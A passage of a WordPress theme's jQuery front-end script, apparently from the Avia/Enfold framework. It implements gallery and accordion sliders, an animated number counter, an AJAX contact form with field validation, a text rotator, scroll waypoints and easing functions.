				win.on('debouncedresize', set_tab_titlte_pos);	
				win.on('debouncedresize', set_slide_height);	
				
				set_min_width();
				set_slide_height(); 
				get_init_open();
			}
			
		});	
		
		content_wrap.avia_swipe_trigger({prev:'.av_prev_tab_section', next:'.av_next_tab_section'});
			
	});
};




// -------------------------------------------------------------------------------------------
// Horizontal Gallery
// -------------------------------------------------------------------------------------------

$.fn.avia_hor_gallery= function(options)
{
	var defaults =
		{
			slide_container	: '.av-horizontal-gallery-inner', //element with max width
			slide_element	: '.av-horizontal-gallery-slider', //element that gets moved
			slide_content	: '.av-horizontal-gallery-wrap',
			active			: 'av-active-gal-item',				// must be a class string without the . in front
			prev			: '.av-horizontal-gallery-prev',
			next			: '.av-horizontal-gallery-next'
		};

	var options = $.extend(defaults, options);
	
	var win 			= $(window),
		browserPrefix 	= $.avia_utilities.supports('transition'),
		cssActive 		= this.browserPrefix !== false ? true : false,
		isMobile 		= $.avia_utilities.isMobile,
		transform3d		= document.documentElement.className.indexOf('avia_transform3d') !== -1 ? true : false,
		transition		= {};
		
	return this.each(function()
	{
		var container 			= $(this),
			slide_container 	= container.find(options.slide_container),
			slide_element		= container.find(options.slide_element),
			slide_content		= container.find(options.slide_content),
			prev				= container.find(options.prev),
			next				= container.find(options.next),
			imgs				= container.find('img'),
			
			all_elements_width 	= 0,
			currentIndex		= false,
			initial				= container.data('av-initial'),
			
			set_up = function( init )
			{
				var sl_height = (slide_container.width() / 100 ) * slide_container.data('av-height');
				
				slide_container.css({'padding':0}).height(sl_height);
				
				//fixes img distortion when resizing browser:
				imgs.css('display','inline-block');
				setTimeout(function(){ imgs.css('display','block'); }, 10);
				
				//calculate the slidelement width based on the elements inside
				all_elements_width = 0;
				
				slide_content.each(function()
				{ 
					all_elements_width += $(this).outerWidth( true ); 
				});
				
				slide_element.css( 'min-width' , all_elements_width );
				
				if(currentIndex !== false )
				{
					change_active(currentIndex);
				}
			},
			change_active = function(index)
			{
				//scroll the tabs if there is not enough room to display them all
				var current 	= slide_element.find(options.slide_content).eq(index),
					viewport	= slide_container.width(),
					modifier	= container.data('av-enlarge') > 1  && currentIndex == index ? container.data('av-enlarge') : 1,
					outerWidth	= current.outerWidth( true ) * modifier,
					margin_right= parseInt( current.css('margin-right') , 10 ) / 2,
					left_pos	= viewport < all_elements_width ? (current.position().left * - 1) - (outerWidth / 2) + (viewport / 2): 0;
				
				//center properly
				left_pos = left_pos + margin_right;
				
				//out of bounce right side
				if(left_pos + all_elements_width < viewport) left_pos = (all_elements_width - viewport - parseInt(current.css('margin-right'),10) ) * -1;
				
				//out of bounce left side
				if(left_pos > 0) left_pos = 0;
				
				//set pos
				slide_element.css('left',left_pos );
				
				slide_container.find("." +options.active).removeClass(options.active);
				current.addClass(options.active);
				currentIndex = index;
				
			};

			
		 $.avia_utilities.preload({container: container , global_callback:  function()
		 {
			 // activate behavior
			set_up( 'init' );
			win.on('debouncedresize', set_up);
			if(initial) change_active(initial - 1);
			
			setTimeout(function(){
				container.addClass('av-horizontal-gallery-animated');
			},10); 
		
		  }});
			
		
		
		
		
		
		
		//swipe on mobile
		slide_element.avia_swipe_trigger({prev:options.prev, next:options.next});
		
		//element click
		slide_content.on('click', function(e)
		{
			var current = $(this);
			var index = slide_content.index(current);
			
			if(currentIndex === index)
			{
				if(container.data('av-enlarge') > 1 && !$(e.target).is('a') )
				{
					//slide_container.find("." +options.active).removeClass(options.active);
					//currentIndex = false;	
				}
				return;
			}
			
			change_active(index);
		});
		
		prev.on('click', function(e)
		{
			if(currentIndex === false) currentIndex = 1;
			var index = currentIndex - 1;
			if(index < 0) index = 0;
			
			change_active(index);
		});
		
		next.on('click', function(e)
		{
			if(currentIndex === false) currentIndex = -1;
			var index = currentIndex + 1;
			if(index > slide_content.length - 1) index = slide_content.length - 1;
			
			change_active(index);
		});
		
		//if its a desktop browser add arrow navigation, otherwise add touch nav
		if(!isMobile)
		{
			container.avia_keyboard_controls({ 37: options.prev, 39: options.next });
		}
		else
		{
			container.avia_swipe_trigger({next: options.next, prev: options.prev});
		}
		
		
	
	});
};

// -------------------------------------------------------------------------------------------
// Big Number animation shortcode javascript
// -------------------------------------------------------------------------------------------

(function($)
{
	// options.simple_up = dont prepend leading zeros, options.instant_start = trigger counting instantly, options.start_timer = delay when to start counting
	$.fn.avia_sc_animated_number = function(options) 
	{
		if(!this.length) return;
		if(this.is('.avia_sc_animated_number_active')) return;
		
		this.addClass('avia_sc_animated_number_active');
	
		var skipStep = false,
			simple_upcount 	= (options && options.simple_up) ? true : false,
			start_timer 	= (options && options.start_timer) ? options.start_timer : 300,
		start_count = function(element, countTo, increment, current, fakeCountTo)
		{
			
			
			//calculate the new number
			var newCount = current + increment;
			
			//if the number is bigger than our final number set the number and finish
			if(newCount >= fakeCountTo) 
			{
				element.text(countTo); //exit
				
			}
			else
			{
				var prepend = "", addZeros = countTo.toString().length - newCount.toString().length
				
				//if the number has less digits than the final number some zeros where omitted. add them to the front
				for(var i = addZeros; i > 0; i--){ prepend += "0"; }
				
				if(simple_upcount) prepend = 0;
				element.text(prepend + newCount);
				
				window.requestAnimationFrame(function(){ start_count(element, countTo, increment, newCount, fakeCountTo) });
			}
		};
	
		return this.each(function()
		{
			var number_container = $(this), elements = number_container.find('.__av-single-number'), countTimer = number_container.data('timer') || 3000;
			
			//prepare elements
			elements.each(function(i)
			{
				var element = $(this), text = element.text();
				if(window.addEventListener) element.text( text.replace(/./g, "0")); /*https://github.com/AviaThemes/wp-themes/issues/812*/
			});
			
			//trigger number animation
			number_container.addClass('number_prepared').on('avia_start_animation', function()
			{
				if(number_container.is('.avia_animation_done')) return;
				number_container.addClass('avia_animation_done');
				
				elements.each(function(i)
				{
					var element = $(this), countTo = element.data('number'), fakeCountTo = countTo, current = parseInt(element.text(),10), zeroOnly = /^0+$/.test(countTo), increment = 0;
					
					//fallback for decimals like 00 or 000
					if(zeroOnly && countTo !== 0) fakeCountTo = countTo.replace(/0/g, '9');
					
					increment = Math.round( fakeCountTo * 32 / countTimer);
					if(increment == 0 || increment % 10 == 0) increment += 1;
					
					setTimeout(function(){ start_count(element, countTo, increment, current, fakeCountTo);}, start_timer);
				});
			});
			
			if(options && options.instant_start == true)
			{
				number_container.trigger('avia_start_animation');
			}
			
			
		});
	}
})(jQuery);




// -------------------------------------------------------------------------------------------
// contact form ajax
// -------------------------------------------------------------------------------------------

(function($)
{
	$.fn.avia_ajax_form = function(variables)
	{	
		var defaults =
		{
			sendPath: 'send.php',
			responseContainer: '.ajaxresponse'
		};

		var options = $.extend(defaults, variables);

		return this.each(function()
		{
			var form = $(this),
				form_sent = false,
				send =
				{
					formElements: form.find('textarea, select, input[type=text], input[type=checkbox], input[type=hidden]'),
					validationError:false,
					button : form.find('input:submit'),
					dataObj : {}
				},

				responseContainer = form.next(options.responseContainer+":eq(0)");

				send.button.bind('click', checkElements);
				
				
				//change type of email forms on mobile so the e-mail keyboard with @ sign is used
				if($.avia_utilities.isMobile)
				{
					send.formElements.each(function(i)
					{
						var currentElement = $(this), is_email = currentElement.hasClass('is_email');
						if(is_email) currentElement.attr('type','email');
					});
				}
			

			function checkElements( e )
			{
				// reset validation var and send data
				send.validationError = false;
				send.datastring = 'ajax=true';

				send.formElements.each(function(i)
				{
					var currentElement = $(this),
						surroundingElement = currentElement.parent(),
						value = currentElement.val(),
						name = currentElement.attr('name'),
					 	classes = currentElement.attr('class'),
					 	nomatch = true;

					 	if(currentElement.is(':checkbox'))
					 	{
					 		if(currentElement.is(':checked')) { value = true } else {value = ''}
					 	}
					 	
					 	send.dataObj[name] = encodeURIComponent(value);

					 	if(classes && classes.match(/is_empty/))
						{
							if(value == '' || value == null)
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("error");
								send.validationError = true;
							}
							else
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("valid");
							}
							nomatch = false;
						}

						if(classes && classes.match(/is_email/))
						{
							if(!value.match(/^[\w|\.|\-]+@\w[\w|\.|\-]*\.[a-zA-Z]{2,20}$/))
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("error");
								send.validationError = true;
							}
							else
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("valid");
							}
							nomatch = false;
						}

						if(classes && classes.match(/is_phone/))
						{
							if(!value.match(/^(\d|\s|\-|\/|\(|\)|\[|\]|e|x|t|ension|\.|\+|\_|\,|\:|\;){3,}$/))
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("error");
								send.validationError = true;
							}
							else
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("valid");
							}
							nomatch = false;
						}

						if(classes && classes.match(/is_number/))
						{
							if(!($.isNumeric(value)) || value == "")
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("error");
								send.validationError = true;
							}
							else
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("valid");
							}
							nomatch = false;
						}

						if(classes && classes.match(/captcha/))
						{
							var verifier 	= form.find("#" + name + "_verifier").val(),
								lastVer		= verifier.charAt(verifier.length-1),
								finalVer	= verifier.charAt(lastVer);

							if(value != finalVer)
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("error");
								send.validationError = true;
							}
							else
							{
								surroundingElement.removeClass("valid error ajax_alert").addClass("valid");
							}
							nomatch = false;
						}

						if(nomatch && value != '')
						{
							surroundingElement.removeClass("valid error ajax_alert").addClass("valid");
						}
				});

				if(send.validationError == false)
				{
					if(form.data('av-custom-send'))
					{
						mailchimp_send();	
					}
					else
					{
						send_ajax_form();
					}
				}
				
				return false;
			}
			
			
			function send_ajax_form()
			{
				if(form_sent){ return false; }

				form_sent = true;
				send.button.addClass('av-sending-button');
				send.button.val(send.button.data('sending-label'));
				
				var redirect_to = form.data('avia-redirect') || false,
					action		= form.attr('action');
				
				responseContainer.load(action+' '+options.responseContainer, send.dataObj, function()
				{
					if(redirect_to && action != redirect_to)
					{
						form.attr('action', redirect_to);
						location.href = redirect_to;
						// form.submit();
					}
					else
					{
						responseContainer.removeClass('hidden').css({display:"block"});
						form.slideUp(400, function(){responseContainer.slideDown(400, function(){ $('body').trigger('av_resize_finished'); }); send.formElements.val('');});
					}
				});
			}
			
			
			function mailchimp_send()
			{
				if(form_sent){ return false; }

				form_sent = true;
				
				var original_label = send.button.val();

				send.button.addClass('av-sending-button');
				send.button.val(send.button.data('sending-label'));
				send.dataObj.ajax_mailchimp = true;
				
				var redirect_to 		= form.data('avia-redirect') || false,
					action				= form.attr('action'),
					error_msg_container = form.find('.av-form-error-container'),
					form_id 			= form.data('avia-form-id'); 
				
				$.ajax({
					url: action,
					type: "POST",
					data:send.dataObj,
					beforeSend: function()
					{
						if(error_msg_container.length)
						{
							error_msg_container.slideUp(400, function()
							{
								error_msg_container.remove();
								$('body').trigger('av_resize_finished');
							});
						}
					},
					success: function(responseText)
					{
						var response	= jQuery("<div>").append(jQuery.parseHTML(responseText)),
							error		= response.find('.av-form-error-container');	
						
						if(error.length)
						{
							form_sent = false;
							form.prepend(error);
							error.css({display:"none"}).slideDown(400, function()
							{
								$('body').trigger('av_resize_finished');
							});

							send.button.removeClass('av-sending-button');
							send.button.val(original_label);
						}
						else
						{
							if(redirect_to && action != redirect_to)
							{
								form.attr('action', redirect_to);
								location.href = redirect_to;
								// form.submit();
							}
							else
							{
								var success_text = response.find(options.responseContainer + "_" + form_id);
								
								responseContainer.html(success_text).removeClass('hidden').css({display:"block"});
								
								form.slideUp(400, function()
								{
									responseContainer.slideDown(400, function()
									{ 
										$('body').trigger('av_resize_finished'); 
									});
									
								send.formElements.val('');
							});
							}
						}
						
					},
					error: function()
					{
						
					},
					complete: function()
					{
					    
					}
				});

			}
			
			
		});
	};
})(jQuery);












// -------------------------------------------------------------------------------------------
// Aviaccordion Slideshow 
// 
// accordion slider script
// -------------------------------------------------------------------------------------------

	$.AviaccordionSlider  =  function(options, slider)
	{
	    this.$slider  	= $( slider );
	    this.$inner	  	= this.$slider.find('.aviaccordion-inner');
	    this.$slides	= this.$inner.find('.aviaccordion-slide');
	    this.$images	= this.$inner.find('.aviaccordion-image');
	    this.$last		= this.$slides.filter(':last');
	    this.$titles  	= this.$slider.find('.aviaccordion-preview');
	    this.$titlePos  = this.$slider.find('.aviaccordion-preview-title-pos');
	    this.$titleWrap = this.$slider.find('.aviaccordion-preview-title-wrap');
	    this.$win	  	= $( window );
	    
	    if($.avia_utilities.supported.transition === undefined)
		{
			$.avia_utilities.supported.transition = $.avia_utilities.supports('transition');
		}
		
		this.browserPrefix 	= $.avia_utilities.supported.transition;
	    this.cssActive 		= this.browserPrefix !== false ? true : false;
	    this.transform3d	= document.documentElement.className.indexOf('avia_transform3d') !== -1 ? true : false;
		this.isMobile 		= $.avia_utilities.isMobile;
		this.property		= this.browserPrefix + 'transform',
		this.count			= this.$slides.length;
		this.open			= false;
		this.autoplay		= false;
		this.increaseTitle  = this.$slider.is(".aviaccordion-title-on-hover");
		// this.cssActive    = false; //testing no css3 browser
		
	    this._init( options );
	}

  	$.AviaccordionSlider.prototype =
    {
    	_init: function( options )
    	{
    		var _self = this;
    		_self.options = $.extend({}, options, this.$slider.data());
			 $.avia_utilities.preload({container: this.$slider , single_callback:  function(){ _self._kickOff(); }});
    	},
    	
    	_kickOff: function()
    	{
    		var _self = this;
    		
    		_self._calcMovement();
    		_self._bindEvents();
    		_self._showImages();
    		_self._autoplay();
    	},
    	
    	_autoplay: function()
    	{
    		var _self = this;
    		
    		if(_self.options.autoplay)
    		{
    			_self.autoplay = setInterval(function()
    			{
    				_self.open = _self.open === false ? 0 : _self.open + 1;
    				if(_self.open >= _self.count) _self.open = 0;
    				_self._move({}, _self.open);
    				
    			}, _self.options.interval * 1000)
    		}
    	},
    	
    	_showImages: function()
    	{
    		var _self = this, counter = 0, delay = 300, title_delay = this.count * delay;
    		
    		if(this.cssActive)
    		{
    			setTimeout(function(){ _self.$slider.addClass('av-animation-active'); } , 10);
    		}
    		
    		this.$images.each(function(i)
    		{
    			var current = $(this), timer = delay * (i + 1);
    				
    			setTimeout(function()
    			{ 
    				current.avia_animate({opacity:1}, 400, function()
    				{
    					current.css($.avia_utilities.supported.transition + "transform", "none");
    				}); 
    			},timer);
    		});
    		
    		if(_self.increaseTitle) title_delay = 0;
    		
    		this.$titlePos.each(function(i)
    		{
    			var current = $(this), new_timer = title_delay + 100 * (i + 1);
    					
    			setTimeout(function()
    			{ 
    				current.avia_animate({opacity:1}, 200, function()
    				{
    					current.css($.avia_utilities.supported.transition + "transform", "none");
    				}); 
    			},new_timer);
    		});
    	},
    	
    	_bindEvents: function()
    	{
    		var trigger = this.isMobile ? "click" : "mouseenter";
    	
    		this.$slider.on(trigger,'.aviaccordion-slide', $.proxy( this._move, this));
    		this.$slider.on('mouseleave','.aviaccordion-inner', $.proxy( this._move, this));
    		this.$win.on('debouncedresize', $.proxy( this._calcMovement, this));
    		this.$slider.on('av-prev av-next', $.proxy( this._moveTo, this));
    		
    		if(this.isMobile)
    		{
    			this.$slider.avia_swipe_trigger({next: this.$slider, prev: this.$slider, event:{prev: 'av-prev', next: 'av-next'}});
    		}
    		
    	},
    	
    	_titleHeight: function()
    	{
    		var th = 0;
    		
    		this.$titleWrap.css({'height':'auto'}).each(function()
    		{
    			var new_h = $(this).outerHeight();
    			if( new_h > th) th = new_h;
    		
    		}).css({'height':th + 2});
    		
    	},
    	
    	_calcMovement: function(event, allow_repeat)
    	{ 
    		var _self			= this,
    			containerWidth	= this.$slider.width(),
    			defaultPos		= this.$last.data('av-left'),
    			imgWidth		= this.$images.filter(':last').width() || containerWidth,
    			imgWidthPercent = Math.floor((100 / containerWidth) * imgWidth),
    			allImageWidth	= imgWidthPercent * _self.count,
    			modifier		= 3, // 10 - _self.count,
    			tempMinLeft		= 100 - imgWidthPercent,
    			minLeft 		= tempMinLeft > defaultPos / modifier ? tempMinLeft : 0,
    			oneLeft			= minLeft / (_self.count -1 ),
    			titleWidth		= imgWidth;
    		
    		
    		
    		if(allImageWidth < 110 && allow_repeat !== false)
    		{
    			//set height if necessary	
    			var slideHeight = this.$slider.height(), 
    				maxHeight 	= (slideHeight / allImageWidth) * 110 ;
    			
    			this.$slider.css({'max-height': maxHeight});
    			_self._calcMovement(event, false);
    			return;
    		}
    		
    		//backup so the minimized slides dont get too small
    		if(oneLeft < 2) minLeft = 0;
    		
			this.$slides.each(function(i)
			{
				var current = $(this), newLeft = 0, newRight = 0, defaultLeft = current.data('av-left');
					
				if( minLeft !== 0)
				{
					newLeft  = oneLeft * i;
					newRight = imgWidthPercent + newLeft - oneLeft;
				}
				else
				{
					newLeft  = defaultLeft / Math.abs(modifier);
					newRight = 100 - ((newLeft / i) * (_self.count - i));
				}
				
				if(i == 1 && _self.increaseTitle) { titleWidth = newRight + 1; } 
				
				if(_self.cssActive)
				{	
					//if we are not animating based on the css left value but on css transform we need to subtract the left value
					newLeft = newLeft - defaultLeft;
					newRight = newRight - defaultLeft;
					defaultLeft = 0;
				}
				
				current.data('av-calc-default', defaultLeft);
				current.data('av-calc-left', newLeft);
				current.data('av-calc-right', newRight);
				
			});
			
			if(_self.increaseTitle) { _self.$titles.css({width: titleWidth + "%"});} 
    	},
    	
    	_moveTo: function(event)
    	{
    		var direction 	= event.type == "av-next" ? 1 : -1,
    			nextSlide 	= this.open === false ? 0 : this.open + direction;
    			
    		if(nextSlide >= 0 && nextSlide < this.$slides.length) this._move(event, nextSlide);
    	},
    	
    	_move: function(event, direct_open)
    	{
    		var _self  = this,
    			slide  = event.currentTarget,
    			itemNo = typeof direct_open != "undefined" ? direct_open : this.$slides.index(slide);
    			
    		this.open = itemNo;
    		
    		if(_self.autoplay && typeof slide != "undefined") { clearInterval(_self.autoplay); _self.autoplay = false; }
    		
    		this.$slides.removeClass('aviaccordion-active-slide').each(function(i)
    		{
    			var current 	= $(this),
    				dataSet 	= current.data(),
    				trans_val	= i <= itemNo ? dataSet.avCalcLeft : dataSet.avCalcRight,
					transition 	= {},
					reset		= event.type == 'mouseleave' ? 1 : 0,
					active 		= itemNo === i ? _self.$titleWrap.eq(i) : false;
    			
    			if(active) current.addClass('aviaccordion-active-slide');
    				
    			if(reset)
    			{
    				trans_val = dataSet.avCalcDefault; 
    				this.open = false;
    			}
    				
				if(_self.cssActive) //do a css3 animation
				{
					//move the slides
					transition[_self.property]  = _self.transform3d ? "translate3d(" + trans_val  + "%, 0, 0)" : "translate(" + trans_val + "%,0)"; //3d or 2d transform?
					current.css(transition);
				}
				else
				{
					transition.left =  trans_val + "%";
					current.stop().animate(transition, 700, 'easeOutQuint');
				}	
    		});
    	}
    };


$.fn.aviaccordion = function( options )
{
	return this.each(function()
	{
		var active = $.data( this, 'AviaccordionSlider' );

		if(!active)
		{
			//make sure that the function doesnt get aplied a second time
			$.data( this, 'AviaccordionSlider', 1 );
			
			//create the preparations for fullscreen slider
			new $.AviaccordionSlider( options, this );
		}
	});
}











// -------------------------------------------------------------------------------------------
// Aviaccordion Slideshow 
// 
// accordion slider script
// -------------------------------------------------------------------------------------------

	$.AviaTextRotator  =  function(options, slider)
	{
	    this.$win	  	= $( window );
	    this.$slider  	= $( slider );
	    this.$inner	  	= this.$slider.find('.av-rotator-text');
	    this.$slides	= this.$inner.find('.av-rotator-text-single');
	    this.$current   = this.$slides.eq(0);
	    this.open		= 0;
	    this.count		= this.$slides.length;
	    
	    if($.avia_utilities.supported.transition === undefined)
		{
			$.avia_utilities.supported.transition = $.avia_utilities.supports('transition');
		}
		
		this.browserPrefix 	= $.avia_utilities.supported.transition;
	    this.cssActive 		= this.browserPrefix !== false ? true : false;
		this.property		= this.browserPrefix + 'transform',
		
		//this.cssActive    = false; //testing no css3 browser
		
	    this._init( options );
	}

  	$.AviaTextRotator.prototype =
    {
    	_init: function( options )
    	{
    		var _self = this;
    		
    		if(this.count <= 1) return;
    		
    		_self.options = $.extend({}, options, this.$slider.data());
			_self.$inner.addClass('av-rotation-active');
			//if(_self.options.fixwidth == 1) this.$inner.width(this.$current.width());
			_self._autoplay();
    	},
    	
    	_autoplay: function()
    	{
    		var _self = this;
    		
			_self.autoplay = setInterval(function()
			{
				_self.open = _self.open === false ? 0 : _self.open + 1;
				if(_self.open >= _self.count) _self.open = 0;
				_self._move({}, _self.open);
				
			}, _self.options.interval * 1000)
    	},
    	    	
    	_move: function(event)
    	{
	    	var _self 		= this, 
	    		modifier 	= 30 * _self.options.animation, 
	    		fade_out 	= {opacity:0}, 
	    		fade_start  = {display:'inline-block', opacity:0},
	    		fade_in		= {opacity:1};
	    		
    		this.$next = _self.$slides.eq(this.open);
    		
    		if(this.cssActive)
    		{
	    		fade_out[_self.property] 	= "translate(0px," + modifier +"px)";
	    		fade_start[_self.property] 	= "translate(0px," + (modifier * -1) +"px)";
	    		fade_in[_self.property] 	= "translate(0px,0px)";
    		}
    		else
    		{
	    		fade_out['top'] 	= modifier;
	    		fade_start['top'] 	= (modifier * -1);
	    		fade_in['top'] 		= 0;
    		}
    		
    		
    		_self.$current.avia_animate(fade_out, function()
    		{
	    		_self.$current.css({display:'none'});
	    		_self.$next.css(fade_start).avia_animate(fade_in, function()
	    		{
		    		_self.$current = _self.$slides.eq(_self.open);
	    		});
    		});
    	}
    };


$.fn.avia_textrotator = function( options )
{
	return this.each(function()
	{
		var active = $.data( this, 'AviaTextRotator' );

		if(!active)
		{
			//make sure that the function doesnt get aplied a second time
			$.data( this, 'AviaTextRotator', 1 );
			
			//create the preparations for fullscreen slider
			new $.AviaTextRotator( options, this );
		}
	});
}















// -------------------------------------------------------------------------------------------
// HELPER FUNCTIONS
// -------------------------------------------------------------------------------------------


//waipoint script when something comes into viewport
 $.fn.avia_waypoints = function(options_passed)
	{
		if(! $('html').is('.avia_transform')) return;

		var defaults = { offset: 'bottom-in-view' , triggerOnce: true},
			options  = $.extend({}, defaults, options_passed),
			isMobile = $.avia_utilities.isMobile;

		return this.each(function()
		{
			var element = $(this);
			
			setTimeout(function()
			{
				if(isMobile)
				{
					element.addClass('avia_start_animation').trigger('avia_start_animation');
				}
				else
				{
					element.waypoint(function(direction)
					{
					 	var current 	= $(this.element),
					 		parent  	= current.parents('.av-animation-delay-container:eq(0)');
					 	
					 	if(parent.length)
					 	{
						 	current.addClass('avia_start_animation_when_active').trigger('avia_start_animation_when_active');
					 	}
					 	
					 	if(!parent.length || (parent.length && parent.is('.__av_init_open')))
					 	{
						 	current.addClass('avia_start_animation').trigger('avia_start_animation');
					 	}
					 	
					 	
					 	
					}, options );
				}
			},100)
			
		});
	};







// window resize script
var $event = $.event, $special, resizeTimeout;

$special = $event.special.debouncedresize = {
	setup: function() {
		$( this ).on( "resize", $special.handler );
	},
	teardown: function() {
		$( this ).off( "resize", $special.handler );
	},
	handler: function( event, execAsap ) {
		// Save the context
		var context = this,
			args = arguments,
			dispatch = function() {
				// set correct event type
				event.type = "debouncedresize";
				$event.dispatch.apply( context, args );
			};

		if ( resizeTimeout ) {
			clearTimeout( resizeTimeout );
		}

		execAsap ?
			dispatch() :
			resizeTimeout = setTimeout( dispatch, $special.threshold );
	},
	threshold: 150
};





$.easing['jswing'] = $.easing['swing'];

$.extend( $.easing,
{
	def: 'easeOutQuad',
	swing: function (x, t, b, c, d) { return $.easing[$.easing.def](x, t, b, c, d); },
	easeInQuad: function (x, t, b, c, d) { return c*(t/=d)*t + b; },
	easeOutQuad: function (x, t, b, c, d) { return -c *(t/=d)*(t-2) + b; },
	easeInOutQuad: function (x, t, b, c, d) { if ((t/=d/2) < 1) return c/2*t*t + b; return -c/2 * ((--t)*(t-2) - 1) + b; },
	easeInCubic: function (x, t, b, c, d) { return c*(t/=d)*t*t + b; },
	easeOutCubic: function (x, t, b, c, d) { return c*((t=t/d-1)*t*t + 1) + b; },
	easeInOutCubic: function (x, t, b, c, d) { if ((t/=d/2) < 1) return c/2*t*t*t + b; return c/2*((t-=2)*t*t + 2) + b;	},
	easeInQuart: function (x, t, b, c, d) { return c*(t/=d)*t*t*t + b;	},
	easeOutQuart: function (x, t, b, c, d) { return -c * ((t=t/d-1)*t*t*t - 1) + b; },
	easeInOutQuart: function (x, t, b, c, d) { if ((t/=d/2) < 1) return c/2*t*t*t*t + b; return -c/2 * ((t-=2)*t*t*t - 2) + b;	},
	easeInQuint: function (x, t, b, c, d) { return c*(t/=d)*t*t*t*t + b;	},
	easeOutQuint: function (x, t, b, c, d) { return c*((t=t/d-1)*t*t*t*t + 1) + b;	},
	easeInOutQuint: function (x, t, b, c, d) { if ((t/=d/2) < 1) return c/2*t*t*t*t*t + b; return c/2*((t-=2)*t*t*t*t + 2) + b;	},
	easeInSine: function (x, t, b, c, d) {	return -c * Math.cos(t/d * (Math.PI/2)) + c + b;	},
	easeOutSine: function (x, t, b, c, d) { return c * Math.sin(t/d * (Math.PI/2)) + b;	},
	easeInOutSine: function (x, t, b, c, d) { return -c/2 * (Math.cos(Math.PI*t/d) - 1) + b;	},
	easeInExpo: function (x, t, b, c, d) { return (t==0) ? b : c * Math.pow(2, 10 * (t/d - 1)) + b;	},
	easeOutExpo: function (x, t, b, c, d) { return (t==d) ? b+c : c * (-Math.pow(2, -10 * t/d) + 1) + b;	},
	easeInOutExpo: function (x, t, b, c, d) {
		if (t==0) return b;
		if (t==d) return b+c;
		if ((t/=d/2) < 1) return c/2 * Math.pow(2, 10 * (t - 1)) + b;
		return c/2 * (-Math.pow(2, -10 * --t) + 2) + b;
	},
	easeInCirc: function (x, t, b, c, d) { return -c * (Math.sqrt(1 - (t/=d)*t) - 1) + b;	},
	easeOutCirc: function (x, t, b, c, d) {return c * Math.sqrt(1 - (t=t/d-1)*t) + b;	},
	easeInOutCirc: function (x, t, b, c, d) { if ((t/=d/2) < 1) return -c/2 * (Math.sqrt(1 - t*t) - 1) + b;	return c/2 * (Math.sqrt(1 - (t-=2)*t) + 1) + b;	},
	easeInElastic: function (x, t, b, c, d) {
		var s=1.70158;var p=0;var a=c;
		if (t==0) return b;  if ((t/=d)==1) return b+c;  if (!p) p=d*.3;
		if (a < Math.abs(c)) { a=c; var s=p/4; }
		else var s = p/(2*Math.PI) * Math.asin (c/a);
		return -(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b;
	},
	easeOutElastic: function (x, t, b, c, d) {
		var s=1.70158;var p=0;var a=c;
		if (t==0) return b;  if ((t/=d)==1) return b+c;  if (!p) p=d*.3;
		if (a < Math.abs(c)) { a=c; var s=p/4; }
		else var s = p/(2*Math.PI) * Math.asin (c/a);
		return a*Math.pow(2,-10*t) * Math.sin( (t*d-s)*(2*Math.PI)/p ) + c + b;
	},
	easeInOutElastic: function (x, t, b, c, d) {
		var s=1.70158;var p=0;var a=c;
		if (t==0) return b;  if ((t/=d/2)==2) return b+c;  if (!p) p=d*(.3*1.5);
		if (a < Math.abs(c)) { a=c; var s=p/4; }
		else var s = p/(2*Math.PI) * Math.asin (c/a);
		if (t < 1) return -.5*(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b;
		return a*Math.pow(2,-10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )*.5 + c + b;
	},
	easeInBack: function (x, t, b, c, d, s) {
		if (s == undefined) s = 1.70158;
		return c*(t/=d)*t*((s+1)*t - s) + b;
	},
	easeOutBack: function (x, t, b, c, d, s) {
		if (s == undefined) s = 1.70158;
		return c*((t=t/d-1)*t*((s+1)*t + s) + 1) + b;
	},
	easeInOutBack: function (x, t, b, c, d, s) {
		if (s == undefined) s = 1.70158;
		if ((t/=d/2) < 1) return c/2*(t*t*(((s*=(1.525))+1)*t - s)) + b;
		return c/2*((t-=2)*t*(((s*=(1.525))+1)*t + s) + 2) + b;
	},
	easeInBounce: function (x, t, b, c, d) {
		return c - jQuery.easing.easeOutBounce (x, d-t, 0, c, d) + b;
	},
	easeOutBounce: function (x, t, b, c, d) {
		if ((t/=d) < (1/2.75)) {
			return c*(7.5625*t*t) + b;
		} else if (t < (2/2.75)) {
			return c*(7.5625*(t-=(1.5/2.75))*t + .75) + b;
		} else if (t < (2.5/2.75)) {
			return c*(7.5625*(t-=(2.25/2.75))*t + .9375) + b;
		} else {
			return c*(7.5625*(t-=(2.625/2.75))*t + .984375) + b;
		}
	},
	easeInOutBounce: function (x, t, b, c, d) {
		if (t < d/2) return jQuery.easing.easeInBounce (x, t*2, 0, c, d) * .5 + b;
		return jQuery.easing.easeOutBounce (x, t*2-d, 0, c, d) * .5 + c*.5 + b;
	}
});

})( jQuery );



/*utility functions*/


(function($)
{
	"use strict";

	$.avia_utilities = $.avia_utilities || {};

	/************************************************************************
	gloabl loading function
	*************************************************************************/
	$.avia_utilities.loading = function(attach_to, delay){

		var loader = {

			active: false,

			show: function()
			{
				if(loader.active === false)
				{
					loader.active = true;
					loader.loading_item.css({display:'block', opacity:0});
				}

				loader.loading_item.stop().animate({opacity:1});
			},

			hide: function()
			{	
				if(typeof delay === 'undefined'){ delay = 600; }

				loader.loading_item.stop().delay( delay ).animate({opacity:0}, function()
				{
					loader.loading_item.css({display:'none'});
					loader.active = false;
				});
			},

			attach: function()
			{
				if(typeof attach_to === 'undefined'){ attach_to = 'body';}

				loader.loading_item = $('<div class="avia_loading_icon"><div class="av-siteloader"></div></div>').css({display:"none"}).appendTo(attach_to);
			}
		}

		loader.attach();
		return loader;
	};
	
	/************************************************************************
	gloabl play/pause visualizer function
	*************************************************************************/
	$.avia_utilities.playpause = function(attach_to, delay){

		var pp = {

			active: false,
			to1: "", 
			to2: "", 
			set: function(status)
			{	
				pp.loading_item.removeClass('av-play av-pause');
				pp.to1 = setTimeout(function(){ pp.loading_item.addClass('av-' + status); },10);
